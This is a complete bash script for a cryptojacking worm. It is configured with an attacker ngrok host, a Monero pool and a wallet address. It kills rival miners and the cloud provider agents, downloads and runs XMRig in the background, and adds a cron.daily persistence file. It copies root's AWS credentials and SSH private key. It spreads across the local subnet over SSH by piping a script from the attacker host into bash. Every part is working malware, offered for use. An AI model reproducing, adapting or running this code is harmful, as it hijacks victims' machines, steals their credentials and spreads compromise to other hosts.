#!/bin/bash

# Configuration
ATTACKER_IP="3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app"
ATTACKER_PORT="8080"
POOL_URL="pool.monero.hashvault.pro:3333"
WALLET_ADDRESS="4ADkuMYr8qrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZi4QwBjop9"

LOG_FILE="/tmp/miner_activity.log"
XMRIG_PATH="/tmp/xmrig"
PERSISTENCE_SCRIPT_PATH="/etc/cron.daily/network-service"

TOTAL_CORES=$(nproc 2>/dev/null || echo 2)
LOW_CORES=$(( (TOTAL_CORES * 20 + 99) / 100 ))
MEDIUM_CORES=$(( (TOTAL_CORES * 50 + 99) / 100 ))
HIGH_CORES=$(( (TOTAL_CORES * 80 + 99) / 100 ))

declare -A MODE_CONFIGS
MODE_CONFIGS["low"]="cores=${LOW_CORES:-1} nice=19"
MODE_CONFIGS["medium"]="cores=${MEDIUM_CORES:-1} nice=10"
MODE_CONFIGS["high"]="cores=${HIGH_CORES:-1} nice=0"

# Helper functions
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

ensure_tools() {
    for tool in curl wget tar pkill nc; do
        if ! command -v $tool &> /dev/null; then
            log "Tool $tool not found. Attempting to install."
            if command -v apt-get &> /dev/null; then
                apt-get update -y && apt-get install -y $tool netcat-openbsd
            elif command -v yum &> /dev/null; then
                yum install -y $tool nc
            fi
        fi
    done
}

# Core functions
remove_competition() {
    log "TTP-1: Removing competition."
    pkill -f kdevtmpfsi || log "kdevtmpfsi not found."
    pkill -f kinsing || log "kinsing not found."
    pkill -f minerd || log "minerd not found."
    pkill -f xmrig || log "xmrig not found."
    pkill -f cpuminer || log "cpuminer not found."
    pkill -f cryptonight || log "cryptonight not found."
    pkill -f AliYunDun || log "AliYunDun (Alibaba Cloud) agent not found."
    pkill -f /usr/sbin/waagent || log "waagent (Azure) not found."
    log "Competition removal attempt complete."
}

install_miner() {
    local mode=$1
    local config=${MODE_CONFIGS[$mode]}
    eval "$config"

    if pgrep -f "xmrig" > /dev/null; then
        log "Miner is already running."
        return
    fi
    log "TTP-2: Installing and starting miner in $mode mode (cores=$cores)."
    if [ ! -f "$XMRIG_PATH" ]; then
        log "Downloading XMRig..."
        curl -s -L "https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz" -o /tmp/xmrig.tar.gz
        if [ $? -ne 0 ]; then
            log "Failed to download xmrig."
            return
        fi
        tar -xzf /tmp/xmrig.tar.gz -C /tmp/
        mv /tmp/xmrig-6.17.0/xmrig "$XMRIG_PATH"
        rm -rf /tmp/xmrig.tar.gz /tmp/xmrig-6.17.0
        chmod +x "$XMRIG_PATH"
    fi
    log "Starting XMRig with $cores cores, nice level $nice."
    nice -n "$nice" "$XMRIG_PATH" -o "$POOL_URL" -u "$WALLET_ADDRESS" -p "$(hostname)" -k --coin monero -t "$cores" > /dev/null 2>&1 &
}

ensure_persistence() {
    log "TTP-3: Ensuring persistence."
    cat > "$PERSISTENCE_SCRIPT_PATH" << EOF
#!/bin/bash
$XMRIG_PATH -o $POOL_URL -u $WALLET_ADDRESS -p $(hostname) -k --coin monero -t $MEDIUM_CORES > /dev/null 2>&1 &
EOF
    chmod +x "$PERSISTENCE_SCRIPT_PATH"
    log "Persistence script created at $PERSISTENCE_SCRIPT_PATH."
}

harvest_credentials() {
    log "TTP-4: Harvesting credentials."
    if [ -f /root/.aws/credentials ]; then
        cp /root/.aws/credentials /tmp/aws_credentials
        log "AWS credentials harvested."
    fi
    if [ -f /root/.ssh/id_rsa ]; then
        cp /root/.ssh/id_rsa /tmp/ssh_key
        log "SSH key harvested."
    fi
}

propagate() {
    log "TTP-5: Propagating to local network."
    for ip in $(seq 1 254); do
        target="192.168.1.$ip"
        if nc -z -w 1 $target 22 2>/dev/null; then
            log "Attempting propagation to $target via SSH."
            ssh -o StrictHostKeyChecking=no root@$target "curl -s http://$ATTACKER_IP:$ATTACKER_PORT/miner.sh | bash -s -- --mode medium" 2>/dev/null &
        fi
    done
}

main() {
    cd /tmp
    local mode="medium"
    if [ "$1" == "--mode" ] && [ -n "$2" ]; then
        mode=$2
    fi
    log "--- Script starting on $(hostname) with mode: $mode ---"
    ensure_tools
    remove_competition
    install_miner "$mode"
    ensure_persistence
    harvest_credentials
    propagate
    log "--- Script execution finished. Miner should be running. ---"
}

if [ "${BASH_SOURCE[0]}" == "$0" ]; then
    main "$@"
fi
